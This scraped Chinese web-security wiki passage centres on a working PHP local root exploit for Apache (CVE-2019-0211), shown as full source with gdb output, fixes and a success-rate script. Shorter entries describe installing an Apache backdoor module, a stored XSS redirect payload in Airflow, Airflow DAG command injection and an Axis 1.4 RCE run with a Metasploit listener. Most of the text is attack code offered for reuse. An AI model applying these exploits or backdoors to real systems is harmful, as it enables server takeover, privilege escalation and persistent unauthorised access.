$result[$result_index][1] = hexdec($end_addr_str); $result[$result_index][2] = substr($line,$addr_len*2+2,4); $result_index++; } } fclose($file); return $result; } function locate_parent_arr_addr()//获取共享内存中，parent数组的首地址 { $my_pid = getmypid(); $shm_region = get_mem_region(\"/dev/zero\"); if(!count($shm_region)) return 0; //parent数组项的大小是，每个0x20个字节 //pid_t在我环境中，大小4字节 $pid_t_size = 4; $parent_size = 0x24; //只检查共享内存的前0x1000字节(4KB) for($i = 0;$i zend_object_std_dtor\\n\"; write_mem_qword($evil_mutex_methods_start_addr+0x30,$zend_object_std_dtor_addr); //将混合结构zend_array的pDestructor指向system $pDestructor = $evil_zend_array_start_addr + 0x30; echo \"pDestructor(0x\".dechex($pDestructor).\") => system\\n\"; write_mem_qword($pDestructor,$system_addr); //将混合结构zend_array的meth指向apr_proc_mutex_unix_lock_methods_t $meth = $evil_zend_array_start_addr + 0x8; echo \"meth(0x\".dechex($meth).\") => mutex_mthods_struct\\n\"; write_mem_qword($meth,$evil_mutex_methods_start_addr); write_mem_qword($evil_zend_array_start_addr,0x1); //将prefork_child_bucket中的mutex指向混合结构zend_array $mutex = $evil_parent_start_addr + 0x10; echo \"mutex(0x\".dechex($mutex).\") => zend_array struct\\n\"; write_mem_qword($mutex,$evil_zend_array_start_addr); //将混合结构prefork_child_bucket中的properties指向zend_array结构 $properties = $evil_parent_start_addr + 0x20+0x10; echo \"properties(0x\".dechex($properties).\") => zend_array struct\\n\"; write_mem_qword($properties,$evil_zend_array_start_addr); //system 字符串 写入 for($i = 0;$i evil string\\n\"; write_mem_qword($ar_data,$evil_string_start_addr); //将zend_array中的nNumUsed设置为1，（自行分析代码去） $nNumUsed = $evil_zend_array_start_addr + 0x18; write_mem_qword($nNumUsed,1); //堆喷 echo \"\\nSpraying the shared memory start\\n\\n\"; $shm_region = get_mem_region(\"/dev/zero\"); $evil_shm_start_addr = $evil_string_end_addr; $evil_shm_end_addr = $shm_region[0][1]; $evil_shm_size = $evil_shm_end_addr - $evil_shm_start_addr; $evil_shm_mid_addr = $evil_shm_start_addr + 8*((int)(((int)($evil_shm_size/2))/8) + 1); echo \"evil_shm_start:0x\".dechex($evil_shm_start_addr).\"\\n\"; echo \"evil_shm_end:0x\".dechex($evil_shm_end_addr).\"\\n\"; echo \"evil_shm_size:\".dechex($evil_shm_size).\"\\n\"; for($i = 0;$i 利用成功时，会在根目录下，创建hello文件 步骤 根目录显示 ➜ ~ ls / bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var www 让服务器执行恶意php代码 ➜ ~ curl 127.0.0.1 PID: 19896 /dev/zero start addr:0x7f1f62a32000 /dev/zero end addr:0x7f1f62a4a000 self parent struct addr:0x7f1f62a32040 parent arr addr:0x7f1f62a32040 heap start addr:0xf59000 heap end addr:0x1022000 libapr text start addr:0x7f1f61ffa000 libapr text end addr:0x7f1f6202f000 libapr data start addr:0x7f1f6222e000 libapr data end addr:0x7f1f6222f000 all_buckets addr:0xff0c18 evil prefork_child_bucket start addr:0x7f1f62a321a8 evil prefork_child_bucket end addr:0x7f1f62a321e0 evil zend_array start addr:0x7f1f62a321e0 evil zend_array end addr:0x7f1f62a32218 evil mutex_methods start addr:0x7f1f62a32218 evil mutex_methods end addr:0x7f1f62a32268 evil string: touch /hello len:16 evil string start addr:0x7f1f62a32268 evil string end addr:0x7f1f62a32278 zend_object_std_dtor function addr:0x7f1f5c03d300 system function addr:0x7f1f617a94c0 child_init(0x7f1f62a32248) => zend_object_std_dtor pDestructor(0x7f1f62a32210) => system meth(0x7f1f62a321e8) => mutex_mthods_struct mutex(0x7f1f62a321b8) => zend_array struct properties(0x7f1f62a321d8) => zend_array struct ar_data(0x7f1f62a321f0) => evil string Spraying the shared memory start evil_shm_start:0x7f1f62a32278 evil_shm_end:0x7f1f62a4a000 evil_shm_size:17d88 evil_shm_mid_addr:0x7f1f62a3e140 bucket:fe3ec349aa5 此时，共享内存中，已经被我们的恶意数据给填充。 为通过gdb模拟修改bucket指向我们的恶意结构做准备 [root@bogon john]# ps -aux | grep httpd root 19895 0.0 0.2 285296 10652 ? Ss 14:27 0:00 /usr/local/httpd//bin/httpd -k start www 19896 0.0 0.2 287512 9348 ? S 14:27 0:00 /usr/local/httpd//bin/httpd -k start www 19897 0.0 0.1 287512 7616 ? S 14:27 0:00 /usr/local/httpd//bin/httpd -k start www 19898 0.0 0.1 287512 7616 ? S 14:27 0:00 /usr/local/httpd//bin/httpd -k start www 19899 0.0 0.1 287512 7616 ? S 14:27 0:00 /usr/local/httpd//bin/httpd -k start www 19900 0.0 0.1 287512 7616 ? S 14:27 0:00 /usr/local/httpd//bin/httpd -k start root 20112 0.0 0.0 112708 980 pts/2 R+ 14:30 0:00 grep --color=auto httpd [root@bogon john]# gdb attach 19895 (gdb) break child_main Breakpoint 1 at 0x46c000: file prefork.c, line 380. (gdb) set follow-fork-mode child (gdb) c 执行apachectl graceful，使其优雅重启 [root@bogon john]# apachectl graceful [root@bogon john]# 修改my_bucket 我们将my_bucket，设置为0x7f1f62a3e140，该地址是执行恶意PHP代码时，输出的evil_shm_mid_addr Continuing. Program received signal SIGUSR1, User defined signal 1. 0x00007f1f612bdf53 in __select_nocancel () from /lib64/libc.so.6 (gdb) c Continuing. [New process 20155] [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib64/libthread_db.so.1\". [Switching to Thread 0x7f1f62ae9780 (LWP 20155)] Breakpoint 1, child_main (child_num_arg=child_num_arg@entry=0, child_bucket=child_bucket@entry=0) at prefork.c:380 380 { (gdb) set my_bucket = 0x7f1f62a3e140 (gdb) c Continuing. [New process 20177] [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib64/libthread_db.so.1\". process 20177 is executing new program: /usr/bin/bash Error in re-setting breakpoint 1: Function \"child_main\" not defined. process 20177 is executing new program: /usr/bin/touch Missing separate debuginfos, use: debuginfo-install bash-4.2.46-31.el7.x86_64 [Inferior 3 (process 20177) exited normally] Missing separate debuginfos, use: debuginfo-install coreutils-8.22-23.el7.x86_64 (gdb) 查看根目录，发现利用成功 ➜ ~ ls / bin boot dev etc hello home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var www EXP分析 1.在作者提供的Exp中，没有依赖具体的硬编码数值。在get_all_address函数中利用 /proc/self/maps和文件读取的方式定位到了如下shm, system, libaprR, libaprX, apache, zend_object_std_dtor几个函数的地址以及共享内存起始地址。 2.在get_workers_pids中通过枚举/proc//cmdline and /proc//status文件，得到所有worker进程的PID，用于后续在共享内存中定位process_score地址。 3.最终在real函数中，作者通过在共享内存中查找worker process的PID从而定位到每个process_score结构，并利用被UAF漏洞修改过的字符串对内存进行修改。利用内存模式匹配找到all_buckets的起始位置，并复用了 在scoreboard中空闲的servers结构保存生成的payload。最后利用在2步中获取的worker进程id找到所有的process_score，将其中的bucket修改成指定可利用的值。 补充 关于需要开始ssl模块说明： 就算不开ssl模块，漏洞也是存在的 就算不开启ssl模块，你自己修改apache配置，能开启其他端口，也是能利用的 如果只开了80端口，则需要另行找一条利用链，github上公布exp在只开启了一个端口的情况下是无效的 \\@cfreal的文章中已经说了，我这里在多说句，相关代码可以看看1和2还有SAFE_ACCPET的宏定义： /* On some architectures it's safe to do unserialized accept()s in the single * Listen case. But it's never safe to do it in the case where there's * multiple Listen statements. Define SINGLE_LISTEN_UNSERIALIZED_ACCEPT * when it's safe in the single Listen case. */ #ifdef SINGLE_LISTEN_UNSERIALIZED_ACCEPT #define SAFE_ACCEPT(stmt) (ap_listeners->next ? (stmt) : APR_SUCCESS) #else #define SAFE_ACCEPT(stmt) (stmt) #endif 简单的来说，只有在apache开启多个端口的情况下，才会生成mutex互斥锁，而在github上公布的exp就是通过apache的mutex对象来进行利用的。 跑exp中遇到的一些坑 我试过了很多版本，没有一个版本是能直接使用Github上的exp的，在上述表面的版本中，经过调试研究发现了两个问题导致了利用失败： $all_buckets = $i - 0x10 计算出问题 $bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2); 计算出问题 第一个计算all_buckets的地址，使用gdb进行调试，你会发现，这个值并没有算错，但是在执行apache2ctl graceful命令以后，all_buckets 生成了一个新的值，不过只和之前的all_buckets地址差0x38000，所以这个问题很好解决： $all_buckets = $i - 0x10 + 0x38000; 第二个计算没必要这么复杂，而且在我测试的版本中还是算的错误的地址，直接改成： $bucket_index = $bucket_index_middle; ubuntu中的一个坑 我的payload是：curl \"http://www.0-sec.org/cfreal-carpediem.php?cmd=id>/tmp/2323232\" 表面上看是执行成功了，但是却并没有在/tmp目录下发现2323232文件，经过随后的研究发现，systemd重定向了apache的tmp目录，执行下$find /tmp -name \"2323232\"就找到文件了，不过只有root用户能访问。如果不想让systemd重定向tmp目录也简单： $ cat /lib/systemd/system/apache2.service [Unit] Description=The Apache HTTP Server After=network.target remote-fs.target nss-lookup.target [Service] Type=forking Environment=APACHE_STARTED_BY_SYSTEMD=true ExecStart=/usr/sbin/apachectl start ExecStop=/usr/sbin/apachectl stop ExecReload=/usr/sbin/apachectl graceful PrivateTmp=false Restart=on-abort [Install] WantedBy=multi-user.target 关于成功率的说法 在exp的注释中看到了说该利用没法100%成功，有失败的概率，所以我写了个脚本进行测试： #!/bin/bash SUCC=0 COUNT=0 for i in $(seq 1 20) do let COUNT+=1 /etc/init.d/apache2 stop sleep 1 /etc/init.d/apache2 start if [ -f \"/tmp/1982347\" ];then rm /tmp/1982347 fi curl \"http://localhost/cfreal-carpediem.php?cmd=id>/tmp/1982347\" apache2ctl graceful sleep 1 if [ -f \"/tmp/1982347\" ];then let SUCC+=1 fi done echo \"COUNT: $COUNT\" echo \"SUCCESS: $SUCC\" 总结 其他版本的还没有进行测试，但是在这里给一些建议。 check all_buckets地址 这个挺简单的，执行完exp以后，有输出对应的pid和all_buckets地址，可以使用gdb attach上去检查下该地址是否正确：p all_buckets PS：这里要注意下，需要安装dbg包，才有all_buckets符号 ：apt install apache2-dbg=2.4.29-1ubuntu4 如果有问题，就调试检查exp中搜索all_buckets地址的流程 如果没问题，就使用gdb attach主进程(root权限的那个进程)，然后断点下在make_child，然后执行apache2ctl graceful，执行完然后在gdb的流程跳到make_child函数的时候，再输出一次：p all_buckets，和exp获取的值对比一下，如果一样就没问题了 check my_bucket地址 前面的流程和上面一样，重点关注在make_child函数中的my_bucket赋值的代码：3 这里注意下，因为上面有一个fork，所以在gdb里还要加一句：set follow-fork-mode child my_bucket的值是一个指针，指向堆喷的地址，如果my_bucket的值没问题，exp基本就没问题了，如果不对，就调整$bucket_index poc 2 &$y]); } # In order to read/write what comes after in memory, we need to UAF a string so # that we can control its size and make in-place edition. # An easy way to do that is to replace the string by a timelib_rel_time # structure of which the first bytes can be reached by the (y, m, d, h, i, s) # properties of the DateInterval object. # # Steps: # - Create a base object (Z) # - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time) # - Create DateInterval object ($place) meant to be unset and filled by another # - Trigger the UAF by unsetting $y[0], which is still reachable using $this # - Unset $place: at this point, if we create a new DateInterval object, it will # replace $place in memory # - Create a string ($holder) that fills $place's timelib_rel_time structure # - Allocate a new DateInterval object: its timelib_rel_time structure will # end up in place of abc # - Now we can control $this->abc's zend_string structure entirely using # y, m, d etc. # - Increase abc's size so that we can read/write memory that comes after it, # especially the shared memory block # - Find out all_buckets' position by finding a memory region that matches the # mutex->meth structure # - Compute the bucket index required to reach the SHM and get an arbitrary # function call # - Scan ap_scoreboard_image->parent[] to find workers' PID and replace the # bucket class Z implements JsonSerializable { public function jsonSerialize() { global $y, $addresses, $workers_pids; # # Setup memory # o('Triggering UAF'); o(' Creating room and filling empty spaces'); # Fill empty blocks to make sure our allocations will be contiguous # I: Since a lot of allocations/deallocations happen before the script # is ran, two variables instanciated at the same time might not be # contiguous: this can be a problem for a lot of reasons. # To avoid this, we instanciate several DateInterval objects. These # objects will fill a lot of potentially non-contiguous memory blocks, # ensuring we get \"fresh memory\" in upcoming allocations. $contiguous = []; for($i=0;$iabc = ptr2str(0, 79); # Create $p meant to protect $this's blocks # I: Right after we trigger the UAF, we will unset $p. # This means that the timelib_rel_time structure (TRT) of this object # will be freed. We will then allocate a string ($protector) of the same # size as TRT. Since PHP's heap is LIFO, the string will take the place # of the now-freed TRT in memory. # Then, we create a new DateInterval object ($x). From the same # assumption, every structure constituting this new object will take the # place of the previous structure. Nevertheless, since TRT's memory # block has already been replaced by $protector, the new TRT will be put # in the next free blocks of the same size, which happens to be $abc # (remember, |abc| == |timelib_rel_time|). # We now have the following situation: $x is a DateInterval object whose # internal TRT structure has the same address as $abc's zend_string. $p = new DateInterval('PT1S'); # # Trigger UAF # o(' Unsetting both variables and setting $protector'); # UAF here, $this is usable despite being freed unset($y[0]); # Protect $this's freed blocks unset($p); # Protect $p's timelib_rel_time structure $protector = \".$_protector\"; # !!! This is only required for apache # Got no idea as to why there is an extra deallocation (?) if(version_compare(PHP_VERSION, '7.2') >= 0) $room[] = \"!$_protector\"; o(' Creating DateInterval object'); # After this line: # &((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str # We can control the structure of $this->abc and therefore read/write # anything that comes after it in memory by changing its size and # making in-place edits using $this->abc[$position] = $char $x = new DateInterval('PT1S'); # zend_string.refcount = 0 # It will get incremented at some point, and if it is > 1, # zend_assign_to_string_offset() will try to duplicate it before making # the in-place replacement $x->y = 0x00; # zend_string.len $x->d = 0x100; # zend_string.val[0-4] $x->h = 0x13121110; # Verify UAF was successful # We modified stuff via $x; they should be visible by $this->abc, since # they are at the same memory location. if(!( strlen($this->abc) === $x->d && $this->abc[0] == \"\\x10\" && $this->abc[1] == \"\\x11\" && $this->abc[2] == \"\\x12\" && $this->abc[3] == \"\\x13\" )) { o('UAF failed, exiting.'); exit(); } o('UAF successful.'); o(''); # Give us some room # I: As indicated before, just unset a lot of stuff so that next allocs # don't break our fragile UAFd structure. unset($room); # # Setup the R/W primitive # # We control $abc's internal zend_string structure, therefore we can R/W # the shared memory block (SHM), but for that we need to know the # position of $abc in memory # I: We know the absolute position of the SHM, so we need to need abc's # as well, otherwise we cannot compute the offset # Assuming the allocation was contiguous, memory looks like this, with # 0x70-sized fastbins: # [zend_string:abc] # [zend_string:protector] # [FREE#1] # [FREE#2] # Therefore, the address of the 2nd free block is in the first 8 bytes # of the first block: 0x70 * 2 - 24 $address = str2ptr($this->abc, 0x70 * 2 - 24); # The address we got points to FREE#2, hence we're |block| * 3 higher in # memory $address = $address - 0x70 * 3; # The beginning of the string is 24 bytes after its origin $address = $address + 24; o('Address of $abc: 0x' . dechex($address)); o(''); # Compute the size required for our string to include the whole SHM and # apache's memory region $distance = max($addresses['apache'][1], $addresses['shm'][1]) - $address ; $x->d = $distance; # We can now read/write in the whole SHM and apache's memory region. # # Find all_buckets in memory # # We are looking for a structure s.t. # |all_buckets, mutex| = 0x10 # |mutex, meth| = 0x8 # all_buckets is in apache's memory region # mutex is in apache's memory region # meth is in libaprR's memory region # meth's function pointers are in libaprX's memory region o('Looking for all_buckets in memory'); $all_buckets = 0; for( $i = $addresses['apache'][0] + 0x10; $i abc, $i - $address); if(!in($pointer, $addresses['apache'])) continue; # meth $meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address); if(!in($pointer, $addresses['libaprR'])) continue; o(' [&mutex]: 0x' . dechex($i)); o(' [mutex]: 0x' . dechex($mutex)); o(' [meth]: 0x' . dechex($meth)); # meth->* # flags if(str2ptr($this->abc, $pointer - $address) != 0) continue; # methods for($j=0;$jabc, $pointer + 0x8 + $j * 8 - $address); if(!in($m, $addresses['libaprX'])) continue 2; o(' [*]: 0x' . dechex($m)); } $all_buckets = $i - 0x10; o('all_buckets = 0x' . dechex($all_buckets)); break; } if(!$all_buckets) { o('Unable to find all_buckets'); exit(); } o(''); # The address of all_buckets will change when apache is gracefully # restarted. This is a problem because we need to know all_buckets's # address in order to make all_buckets[some_index] point to a memory # region we control. # # Compute potential bucket indexes and their addresses # o('Computing potential bucket indexes and addresses'); # Since we have sizeof($workers_pid) MPM workers, we can fill the rest # of the ap_score_image->servers items, so 256 - sizeof($workers_pids), # with data we like. We keep the one at the top to store our payload. # The rest is sprayed with the address of our payload. $size_prefork_child_bucket = 24; $size_worker_score = 264; # I get strange errors if I use every \"free\" item, so I leave twice as # many items free. I'm guessing upon startup some $spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2); $spray_max = $addresses['shm'][1]; $spray_min = $spray_max - $spray_size; $spray_middle = (int) (($spray_min + $spray_max) / 2); $bucket_index_middle = (int) ( - ($all_buckets - $spray_middle) / $size_prefork_child_bucket ); # # Build payload # # A worker_score structure was kept empty to put our payload in $payload_start = $spray_min - $size_worker_score; $z = ptr2str(0); # Payload maxsize 264 - 112 = 152 # Offset 8 cannot be 0, but other than this you can type whatever # command you want $bucket = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : \"chmod +s /usr/bin/python3.5\"; if(strlen($bucket) > $size_worker_score - 112) { o( 'Payload size is bigger than available space (' . ($size_worker_score - 112) . '), exiting.' ); exit(); } # Align $bucket = str_pad($bucket, $size_worker_score - 112, \"\\x00\"); # apr_proc_mutex_unix_lock_methods_t $meth = $z . $z . $z . $z . $z . $z . # child_init ptr2str($addresses['zend_object_std_dtor']) ; # The second pointer points to meth, and is used before reaching the # arbitrary function call # The third one and the last one are both used by the function call # zend_object_std_dtor(object) => ... => system(&arData[0]->val) $properties = # refcount ptr2str(1) . # u-nTableMask meth ptr2str($payload_start + strlen($bucket)) . # Bucket arData ptr2str($payload_start) . # uint32_t nNumUsed; ptr2str(1, 4) . # uint32_t nNumOfElements; ptr2str(0, 4) . # uint32_t nTableSize ptr2str(0, 4) . # uint32_t nInternalPointer ptr2str(0, 4) . # zend_long nNextFreeElement $z . # dtor_func_t pDestructor ptr2str($addresses['system']) ; $payload = $bucket . $meth . $properties ; # Write the payload o('Placing payload at address 0x' . dechex($payload_start)); $p = $payload_start - $address; for( $i = 0; $i abc[$p+$i] = $payload[$i]; } # Fill the spray area with a pointer to properties $properties_address = $payload_start + strlen($bucket) + strlen($meth); o('Spraying pointer'); o(' Address: 0x' . dechex($properties_address)); o(' From: 0x' . dechex($spray_min)); o(' To: 0x' . dechex($spray_max)); o(' Size: 0x' . dechex($spray_size)); o(' Covered: 0x' . dechex($spray_size * count($workers_pids))); o(' Apache: 0x' . dechex( $addresses['apache'][1] - $addresses['apache'][0] )); $s_properties_address = ptr2str($properties_address); for( $i = $spray_min; $i abc[$i - $address] = $s_properties_address[$i % 8]; } o(''); # Find workers PID in the SHM: it indicates the beginning of their # process_score structure. We can then change process_score.bucket to # the index we computed. When apache reboots, it will use # all_buckets[ap_scoreboard_image->parent[i]->bucket]->mutex # which means we control the whole apr_proc_mutex_t structure. # This structure contains pointers to multiple functions, especially # mutex->meth->child_init(), which will be called before privileges # are dropped. # We do this for every worker PID, incrementing the bucket index so that # we cover a bigger range. o('Iterating in SHM to find PIDs...'); # Number of bucket indexes covered by our spray $spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket); # Number of bucket indexes covered by our spray and the PS structures $total_nb_buckets = $spray_nb_buckets * count($workers_pids); # First bucket index to handle $bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2); # Iterate over every process_score structure until we find every PID or # we reach the end of the SHM for( $p = $addresses['shm'][0] + 0x20; $p 0; $p += 0x24 ) { $l = $p - $address; $current_pid = str2ptr($this->abc, $l, 4); o('Got PID: ' . $current_pid); # The PID matches one of the workers if(in_array($current_pid, $workers_pids)) { unset($workers_pids[$current_pid]); o(' PID matches'); # Update bucket address $s_bucket_index = pack('l', $bucket_index); $this->abc[$l + 0x20] = $s_bucket_index[0]; $this->abc[$l + 0x21] = $s_bucket_index[1]; $this->abc[$l + 0x22] = $s_bucket_index[2]; $this->abc[$l + 0x23] = $s_bucket_index[3]; o(' Changed bucket value to ' . $bucket_index); $min = $spray_min - $size_prefork_child_bucket * $bucket_index; $max = $spray_max - $size_prefork_child_bucket * $bucket_index; o(' Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max)); # This bucket range is covered, go to the next one $bucket_index += $spray_nb_buckets; } } if(count($workers_pids) > 0) { o( 'Unable to find PIDs ' . implode(', ', $workers_pids) . ' in SHM, exiting.' ); exit(); } o(''); o('EXPLOIT SUCCESSFUL.'); o('Await 6:25AM.'); return 0; } } function o($msg) { # No concatenation -> no string allocation print($msg); print(\"\\n\"); } function ptr2str($ptr, $m=8) { $out = \"\"; for ($i=0; $i>= 8; } return $out; } function str2ptr(&$str, $p, $s=8) { $address = 0; for($j=$s-1;$j>=0;$j--) { $address = $range[0] && $i = 0x10000 && $msize $a) { if(!is_array($a)) $a = [$a]; o(' ' . $k . ': ' . implode('-0x', array_map(function($z) { return '0x' . dechex($z); }, $a))); } o(''); return $addresses; } # Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status, # matching the cmdline and the UID function get_workers_pids() { o('Obtaining apache workers PIDs'); $pids = []; $cmd = file_get_contents('/proc/self/cmdline'); $processes = glob('/proc/*'); foreach($processes as $process) { if(!preg_match('#^/proc/([0-9]+)$#', $process, $match)) continue; $pid = (int) $match[1]; if( !is_readable($process . '/cmdline') || !is_readable($process . '/status') ) continue; if($cmd !== file_get_contents($process . '/cmdline')) continue; $status = file_get_contents($process . '/status'); foreach(explode(\"\\n\", $status) as $line) { if( strpos($line, 'Uid:') === 0 && preg_match('#\\b' . posix_getuid() . '\\b#', $line) ) { o(' Found apache worker: ' . $pid); $pids[$pid] = $pid; break; } } } o('Got ' . sizeof($pids) . ' PIDs.'); o(''); return $pids; } $addresses = get_all_addresses(); $workers_pids = get_workers_pids(); real(); Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:40 "},"Web安全/Apache/Apache后门维持/Apache后门维持.html":{"url":"Web安全/Apache/Apache后门维持/Apache后门维持.html","title":"Apache后门维持","keywords":"","body":"Apache后门维持 一、漏洞简介 通过运行第三方脚本，实现维持后门的方法 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/apache- 1、上传 mod_backdoor.c到服务器，并执行命令 apxs -i -a -c mod_backdoor.c && service apache2 restart 2、控制端执行方法 python exploit.py 127.0.0.1 80 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:36 "},"Web安全/Apache Airflow/（CVE-2019-0216）Apache Airflow 储存型xss/（CVE-2019-0216）Apache Airflow 储存型xss.html":{"url":"Web安全/Apache Airflow/（CVE-2019-0216）Apache Airflow 储存型xss/（CVE-2019-0216）Apache Airflow 储存型xss.html","title":"（CVE-2019-0216）Apache Airflow 储存型xss","keywords":"","body":"（CVE-2019-0216）Apache Airflow 储存型xss 一、漏洞简介 Apache Airflow 1.10.2及之前版本中的airflow webserver服务存在跨站脚本漏洞，该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。 二、漏洞影响 Apache Airflow \\ 三、复现过程 访问/admin/dagrun/（默认是不需要密码） 创建一个项目 1.png 返回列表，可以看到点击\"运行\"可以让你输入HTML代码 2.png 可以在里面输入代码 _a=\"https://www.0-sec.org\" document.location=_a 3.png 可直接造成储存型xss 4.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:41 "},"Web安全/Apache Airflow/（CVE-2020-11978）Apache Airflow 命令注入漏洞/（CVE-2020-11978）Apache Airflow 命令注入漏洞.html":{"url":"Web安全/Apache Airflow/（CVE-2020-11978）Apache Airflow 命令注入漏洞/（CVE-2020-11978）Apache Airflow 命令注入漏洞.html","title":"（CVE-2020-11978）Apache Airflow 命令注入漏洞","keywords":"","body":"（CVE-2020-11978）Apache Airflow 命令注入漏洞 一、漏洞简介 默认情况下Airflow Web UI是未授权访问的，直接可以登录，而登录后，只能查看DAG的调度状态等，无法进行更多操作。但Airflow Web UI中提供了触发DAG运行的功能，以便测试DAG，同时Airflow为了让使用者可以快速熟悉其DAG开发流程和功能，为了更好的示例这些DAG覆盖了大多的执行器。而其中两个DAG组合起来可触发命令注入导致漏洞产生。 要在WEB UI中先执行下启用DAG，然后才可以执行运行，如下所示 ApacheAirflow命令注入漏洞/media/rId22.png) 二、漏洞影响 Apache Airflow \\ 三、复现过程 漏洞分析 首先看下下面两个DAG #airflow/example_dags/example_trigger_target_dag.py from airflow import DAG from airflow.operators.bash import BashOperator from airflow.operators.python import PythonOperator from airflow.utils.dates import days_ago dag = DAG( dag_id=\"example_trigger_target_dag\", default_args={\"start_date\": days_ago(2), \"owner\": \"airflow\"}, schedule_interval=None, tags=['example'] ) def run_this_func(**context): \"\"\" Print the payload \"message\" passed to the DagRun conf attribute. :param context: The execution context :type context: dict \"\"\" print(\"Remotely received value of {} for key=message\".format(context[\"dag_run\"].conf[\"message\"])) run_this = PythonOperator(task_id=\"run_this\", python_callable=run_this_func, dag=dag) bash_task = BashOperator( task_id=\"bash_task\", bash_command='echo \"Here is the message: \\'{{ dag_run.conf[\"message\"] if dag_run else \"\" }}\\'\"', dag=dag, ) #airflow/example_dags/example_trigger_controller_dag.py from airflow import DAG from airflow.operators.dagrun_operator import TriggerDagRunOperator from airflow.utils.dates import days_ago dag = DAG( dag_id=\"example_trigger_controller_dag\", default_args={\"owner\": \"airflow\", \"start_date\": days_ago(2)}, schedule_interval=\"@once\", tags=['example'] ) trigger = TriggerDagRunOperator( task_id=\"test_trigger_dagrun\", trigger_dag_id=\"example_trigger_target_dag\", # Ensure this equals the dag_id of the DAG to trigger conf={\"message\": \"Hello World\"}, dag=dag, ) 官方对这两个DAG的说明如下： Example usage of the TriggerDagRunOperator. This example holds 2 DAGs: 1. 1st DAG (example_trigger_controller_dag) holds a TriggerDagRunOperator, which will trigger the 2nd DAG 2. 2nd DAG (example_trigger_target_dag) which will be triggered by the TriggerDagRunOperator in the 1st DAG 可以看出Airflow希望通过这两个DAG组合来展示如果通过一个DAG（example_trigger_controller_dag）来动态的调用另外一个DAG（example_trigger_target_dag）。即通过example_trigger_controller_dag内部定义的conf={\"message\": \"Hello World\"}来触发example_trigger_target_dag中bash_command='echo \"Here is the message: \\'{{ dag_run.conf[\"message\"] if dag_run else \"\" }}\\'\"'的运行，此处看起来：存在命令执行点'echo \"Here is the message: \\'{{ dag_run.conf[\"message\"] if dag_run else \"\" }}\\'\"'这边是Python下面的Jinja模板，因此会根据后面的if...else逻辑来执行dag_run.conf[\"message\"]来动态加载内容，此处如果dag_run.conf[\"message\"] 可控，则可以通过Jinja模板注入恶意命令。 但根据上面信息可以看出，输入dag_run.conf[\"message\"]由第一个DGA传递过来的，看起来无法控制。而实际上熟悉下Airflow相关代码即可发现，Airflow中A DAG Run is an object representing an instantiation of the DAG in time.而其中conf 正是用于传递参数的方式， Airflow提供了多渠道可以修改conf，包括命令行例如： airflow dags trigger --conf '{\"conf1\": \"value1\"}' example_parametrized_dag 同时也包含Web UI 上直接触发任意DAG并传递dag_run.conf：ApacheAirflow命令注入漏洞/media/rId26.png) 详细信息可以参考Airflow官方文档中对dag_run的详细说明： http://airflow.apache.org/docs/stable/dag-run.html?highlight=dag\\_run 因此可以直接利用此接口触发example_trigger_target_dag.py的调度，这样就可以绕过example_trigger_controller_dag中写死的配置。 ApacheAirflow命令注入漏洞/media/rId27.png) ApacheAirflow命令注入漏洞/media/rId28.png) 参考链接 https://xz.aliyun.com/t/8037\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:41 "},"Web安全/Apache Axis/（CVE-2019-0227）Apache Axis 1.4远程代码执行/（CVE-2019-0227）Apache Axis 1.4远程代码执行.html":{"url":"Web安全/Apache Axis/（CVE-2019-0227）Apache Axis 1.4远程代码执行/（CVE-2019-0227）Apache Axis 1.4远程代码执行.html","title":"（CVE-2019-0227）Apache Axis 1.4远程代码执行","keywords":"","body":"（CVE-2019-0227）Apache Axis 1.4远程代码执行 一、漏洞简介 Apache Axis™是一个简单对象访问协议（SOAP）引擎。在最近的一次红队行动中，我们发现目标装有老版本的Apache Axis（1.4）。现在较新的有Apache Axis2, Apache CXF,和Metro等。尽管Apache Axis已经过时，但它仍然在许多情况下被使用，例如使用Axis构造的项目难以重写或者项目中含有使用SOAP编码的服务。 我们的目标仍在使用过时的版本，因此我们觉得值得深入挖掘，看看是否有可利用的漏洞。最后，我们找到了一个RCE漏洞，该漏洞是由于在默认的示例中使用了过期的硬编码域名作为默认安装。Apache官方为该漏洞签署编号：CVE-2019-0227。现在，我们已经购买了过期域名（www.xmltoday.com）从而防止该漏洞被恶意利用。在本文中，我们将在本地环境中（无需域名）为你演示这个漏洞，同时这个漏洞对Axis2也有影响。 Axis如果你在服务器的Apache Axis或Axis2的找到服务端请求伪造（SSRF）漏洞，你也可能实现目标服务器的代码执行。在Ambionics Security的博客文章中有类似的介绍。因为涉及到产权保护，我不会介绍那篇文章的太多细节，总而言之：Axis以管理员权限处理localhost的请求，攻击者可以通过SSRF漏洞修改HTTP GET请求部分来伪装成localhost用户。 二、漏洞影响 Apache Axis版本= 1.4 三、复现过程 https://github.com/ianxtianxt/cve-2019-0227 1、需要在msf设置监听，另外需要修改代码24-30行处 ＃您需要更改这些变量以匹配您的配置 myip = “ 192.168.0.117 ” ＃您机器的IP target = “ 192.168.0.102 ” ＃目标IP 网关= “ 192.168.0.1 ” ＃默认网关 targetport = “ 8080 ” ＃目标运行轴的端口（可能是8080） pathtoaxis = “ http://192.168.0.102:8080/axis ” ＃这可以是自定义的视轴安装，但是这是默认 spoofinterface = “ eth0 ” ＃伪造的接口 jspwritepath = “ webapps \\\\ axis \\\\ exploit.jsp ” ＃在目标上写入JSP有效负载的相对路径这是Tomcat安装的默认路径 ApacheAxis1.4远程代码执行/media/rId25.png) 2、然后执行py文件 ApacheAxis1.4远程代码执行/media/rId27.png) 